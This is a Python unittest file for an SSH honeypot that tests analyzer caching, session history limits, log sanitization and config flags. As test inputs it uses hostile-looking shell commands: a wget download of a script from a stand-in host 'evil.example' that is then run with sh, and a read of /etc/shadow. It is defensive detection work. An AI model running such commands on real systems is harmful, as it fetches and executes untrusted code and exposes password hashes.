"""Regression tests for caching, context and structured session history."""

import io
import json
import unittest
from unittest.mock import patch

from honeypot.config import HoneypotConfig
from honeypot.intelligence.analyzer import Analyzer
from honeypot.logger import JsonEventLogger
from honeypot.session import SessionState
from honeypot.shell import run_exec_request


class Channel:
    def settimeout(self, seconds): pass
    def sendall(self, data): pass
    def send_exit_status(self, status): pass
    def close(self): pass


class AnalyzerTests(unittest.TestCase):
    def test_cache_avoids_reparsing_without_skipping_session_statistics(self):
        analyzer = Analyzer()
        for _ in range(100):
            analyzer.analyze("uname -a")
        self.assertEqual(analyzer.cache.misses, 1)
        self.assertEqual(analyzer.cache.hits, 99)
        self.assertEqual(analyzer.summary()["commands_analyzed"], 100)
        self.assertEqual(analyzer.summary()["category_counts"], {"reconnaissance": 100})
        self.assertNotIn("uname -a", str(analyzer.cache._items))

    def test_dynamic_download_correlation_is_not_cached(self):
        analyzer = Analyzer()
        first = analyzer.analyze("sh /tmp/p.sh")
        self.assertNotIn("download_then_execute", first.matched_rules)
        analyzer.analyze("wget -O /tmp/p.sh https://evil.example/p.sh")
        again = analyzer.analyze("sh /tmp/p.sh")
        self.assertIn("download_then_execute", again.matched_rules)
        self.assertGreater(analyzer.cache.hits, 0)

    def test_bounded_session_profile_and_sanitization_in_exec_path(self):
        cfg = HoneypotConfig(command_delay_min=0, command_delay_max=0)
        session = SessionState("198.51.100.3", 1234, max_session_history=3)
        output = io.StringIO()
        logger = JsonEventLogger(output, asynchronous=False)
        for cmd in (b"uname -a", b"uname -a", b"whoami", b"cat /etc/shadow\x1b[31m"):
            run_exec_request(Channel(), session, cmd, cfg, logger)
        records = [json.loads(line) for line in output.getvalue().splitlines()]
        self.assertEqual(session.first_command, "uname -a")
        self.assertEqual(session.last_command, "cat /etc/shadow")
        self.assertEqual(len(session.command_history), 3)
        self.assertEqual(set(session.command_history[-1]), {"time", "command", "score", "category"})
        self.assertEqual(session.behaviors.count("system_discovery"), 1)
        self.assertGreater(session.threat_score, 0)
        self.assertNotIn("\x1b", output.getvalue())
        self.assertEqual([record for record in records if record["event"] == "command"][-1]["command"], "cat /etc/shadow")

    def test_analyzer_failure_logged_and_fake_command_continues(self):
        cfg = HoneypotConfig(command_delay_min=0, command_delay_max=0)
        session = SessionState("198.51.100.1", 1)
        stream = io.StringIO()
        logger = JsonEventLogger(stream, asynchronous=False)
        with patch.object(Analyzer, "analyze", side_effect=RuntimeError("attacker secret")):
            run_exec_request(Channel(), session, b"pwd", cfg, logger)
        lines = [json.loads(line) for line in stream.getvalue().splitlines()]
        self.assertEqual([item["event"] for item in lines], ["analyzer_error", "command"])
        self.assertEqual(lines[0]["component"], "rules")
        self.assertNotIn("attacker secret", stream.getvalue())

    def test_config_flags_apply_to_exec_with_direct_session(self):
        cfg = HoneypotConfig.from_env({"HONEYPOT_INTELLIGENCE_ENABLED": "false", "HONEYPOT_IOC_ENABLED": "false", "HONEYPOT_MAX_SCORE": "100", "HONEYPOT_MAX_SESSION_HISTORY": "3", "HONEYPOT_COMMAND_DELAY_MIN": "0", "HONEYPOT_COMMAND_DELAY_MAX": "0"})
        self.assertFalse(cfg.intelligence_enabled)
        self.assertEqual(cfg.max_score, 100)
        session = SessionState("203.0.113.2", 999)
        stream = io.StringIO()
        run_exec_request(Channel(), session, b"wget https://evil.example/a.sh", cfg, JsonEventLogger(stream, asynchronous=False))
        command = json.loads(stream.getvalue().splitlines()[0])
        self.assertEqual(command["analysis"]["matched_rules"], [])
        self.assertEqual(command["analysis"]["indicators"]["urls"], [])


if __name__ == "__main__":
    unittest.main()
